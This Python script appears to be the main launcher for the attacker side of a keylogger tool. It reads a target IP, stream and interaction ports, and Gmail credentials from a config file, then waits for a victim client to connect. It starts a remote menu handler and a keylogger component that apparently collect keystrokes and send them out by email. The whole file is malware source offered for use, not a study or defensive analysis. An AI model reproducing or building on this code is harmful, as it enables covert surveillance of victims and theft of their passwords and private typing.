import sys
from utils import get_system_name_and_path
from GUI import GUIWindow
from CommunicationHacker import CommunicationHacker
from KeyLoggerHacker import KeyLoggerHacker
from MenuHandlerHacker import MenuHandlerHacker
import logging
import logging.config
import configparser


def main():
	sys_name, temp_path = get_system_name_and_path()

	logging.config.fileConfig('logging.conf')
	logger = logging.getLogger('action')

	if temp_path is None:
		logger.debug("Unknown system!")
		sys.exit(1)

	config = configparser.ConfigParser()
	config.read('config.ini')

	communication = CommunicationHacker(ip_address=config['COMMUNICATION']['ipPlaceholder'],
		port_stream=config['COMMUNICATION']['portStream'],
		port_interact=config['COMMUNICATION']['portInteract'])

	try:
		logger.info('Waiting for connection...')
		communication.connect2stream()
		communication.connect2interaction()
	except Exception as err:
		logger.debug(err)
		sys.exit(2)
	logger.info('Client connected!')

	gui = GUIWindow("KeyStrokeLogger")

	try:
		menu = MenuHandlerHacker(connection=communication, logger=logger)
		menu.start()

		key_logger = KeyLoggerHacker(connection=communication, menu=menu,
				gui=gui, path=temp_path, logger=logger, config=config,
			email_address=config['GMAIL_SERVICE']['EmailAddress'],
			email_password=config['GMAIL_SERVICE']['EmailPassword'])
		key_logger.start()
	except TypeError as err:
		logger.debug(err)
		sys.exit(3)
	except Exception as err:
		logger.debug(err)
		sys.exit(4)

	try:
		gui.run()
	except:
		pass
	gui.gui_running = False


if __name__ == '__main__':
	main()